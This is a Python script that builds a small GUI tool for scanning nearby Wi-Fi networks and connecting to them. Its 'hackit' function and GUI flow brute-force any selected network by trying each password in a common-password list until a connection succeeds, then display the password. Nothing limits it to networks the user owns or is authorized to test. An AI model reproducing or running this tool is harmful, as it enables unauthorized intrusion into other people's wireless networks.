import pywifi
from pywifi import const
import time
import PySimpleGUI as sg
'''
A module used to connect to WIFI using python uses pywifi module as base

Method:-
ncondirect(wifiname,password) :- takes 2 positional arguments as wifiname:string and password:string
returns a message as string does not checks that wifi in range or not
delwifi(wifiname) :- takes 1 positional arguments as wifiname:string
returns a message string
searchnearby() :- returns a list of available wifi network nearby
hackit(ssid) :- takes wifi names and return the password of the wifi
guitake() :- shows all the integration of the function as GUI
'''

def searchnearby(n='1'):
    ls=[]
    if n=="1":
        for i in iface.scan_results():
            ls.append(i.ssid)
        return ls
    else:
        w=''
        for i in iface.scan_results():
            if(i.ssid==n):
                if i.akm[0]==0:
                    w="None"
                elif i.akm[0]==1:
                    w="WPA"
                elif i.akm[0]==2:
                    w="WPAPSK"
                elif i.akm[0]==3:
                    w="WPA2"
                elif i.akm[0]==4:
                    w="WPA2PSK"
                elif i.akm[0]==5:
                    w="Unknown"
                break
        return w

def delwifi(wifiname):
    if iface.status() in (const.IFACE_CONNECTED,const.IFACE_CONNECTING):
        iface.disconnect()
    profile = pywifi.Profile()
    profile.ssid = wifiname
    iface.remove_network_profile(profile)
    return 'Deleted Successfully'
    


def ncondirect(wifiname,password):
    try:
        
        profile = pywifi.Profile()
        profile.ssid = wifiname
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        tmp_profile = iface.add_network_profile(profile)
        iface.connect(tmp_profile)
        time.sleep(4)
        if iface.status()==const.IFACE_CONNECTED:
            return "Successfully Connected Wireless Network"
        else:
            iface.disconnect()
            delwifi(wifiname)
            return "try again later"
    except Exception as e:
        return "error" + str(e)


def hackit(ssid):
    keys=[]

    with open('commonpass.txt','r') as f:
        for i in f:
            i=i.replace('\n','')
            if i not in keys:
                keys.append(i)
    for i in keys:
        i=i.strip()
        p=ncondirect(ssid,i)
        if p=="Successfully Connected Wireless Network":
            return 'password is '+ i
            break
        if "error" in p:
            return "error occured can't hack the wifi"
            break
def layo():
    lay=[[sg.Text('Nearby WIFI list:-',size=(20,1))]]
    keyss=[]
    for i in searchnearby():
        if i not in keyss:
            keyss.append(i)
            lay.append([sg.Text('WiFi SSID:',size=(10,1)),sg.Text(i,key=i,enable_events=True)])
    lay.append([sg.Button('Refresh',size=(20,2))])
    lay.append([sg.Button('Exit',size=(20,2))])
    return lay,keyss

def guitake():
    searchnearby()
    lay,keyss=layo()
    window=sg.Window('WIFI Option',layout=lay)
    
    while True:
        event,value=window.read()
        if event in ('Close',sg.WIN_CLOSED,'Exit'):
            window.close()
            break
        if event in keyss:
           if(searchnearby(window[event].get())=="None"):
               sg.Popup('Open Network  \nNo key needed')
           else:
                sg.Popup('Please wait while Bruteforcing the network\nthis may take a while'+
                         '\nDon\'t close the window',auto_close=True,auto_close_duration=2)
                sg.Popup(hackit(window[event].get()))
                        
        if event=='Refresh' :
            window.close()
            lay,keyss=layo()
            window=sg.Window('WIFi Option',layout=lay)
    
if __name__=="__main__":
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    guitake()
